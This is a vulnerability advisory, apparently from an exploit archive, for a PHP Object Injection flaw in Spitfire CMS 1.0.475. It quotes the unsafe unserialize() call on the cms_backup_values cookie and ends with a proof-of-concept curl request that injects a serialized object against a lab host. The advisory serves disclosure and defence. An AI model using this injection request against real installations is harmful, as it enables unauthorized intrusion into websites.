@@ -1,0 +1,67 @@
+id: 38105
+date: 12/10/2022
+title: Spitfire CMS 1.0.475 PHP Object Injection Vulnerability
+author: LiquidWorm
+cves: 
+
+Spitfire CMS 1.0.475 (cms_backup_values) PHP Object Injection
+
+
+Vendor: Claus Muus
+Product web page: http://spitfire.clausmuus.de
+Affected version: 1.0.475
+
+Summary: Spitfire is a system to manage the content of webpages.
+
+Desc: The application is prone to a PHP Object Injection vulnerability
+due to the unsafe use of unserialize() function. A potential attacker,
+authenticated, could exploit this vulnerability by sending specially
+crafted requests to the web application containing malicious serialized
+input.
+
+-----------------------------------------------------------------------
+cms/edit/tpl_backup.inc.php:
+----------------------------
+47:  private function status ()
+48:  {
+49:      $status = array ();
+50:
+51:      $status['values'] = array ();
+52:      $status['values'] = isset ($_COOKIE['cms_backup_values']) ? unserialize ($_COOKIE['cms_backup_values']) : array ();
+...
+...
+77:  public function save ($values)
+78:  {
+79:      $values = array_merge ($this->status['values'], $values);
+80:      setcookie ('cms_backup_values', serialize ($values), time()+60*60*24*30);
+81:  }
+-----------------------------------------------------------------------
+
+Tested on: nginx
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2022-5720
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5720.php
+
+
+28.09.2022
+
+--
+
+
+> curl -isk -XPOST http://10.0.0.2/cms/edit/tpl_backup_action.php \
+       -H 'Content-Type: application/x-www-form-urlencoded'
+       -H 'Accept: */*'
+       -H 'Referer: http://10.0.0.2/cms/edit/cont_index.php?tpl=backup'
+       -H 'Accept-Encoding: gzip, deflate'
+       -H 'Accept-Language: en-US,en;q=0.9'
+       -H 'Connection: close' \
+       -H 'Cookie: tip=0; cms_backup_values=O%3a3%3a%22ZSL%22%3a0%3a%7b%7d; cms_username=admin; PHPSESSID=0e63d3a8762f4bff95050d1146db8c1c' \
+       --data 'action=save&&value=1'
+      #--data 'action=save&&value[files]={}'
+
+#  0day.today [2023-03-27]  #
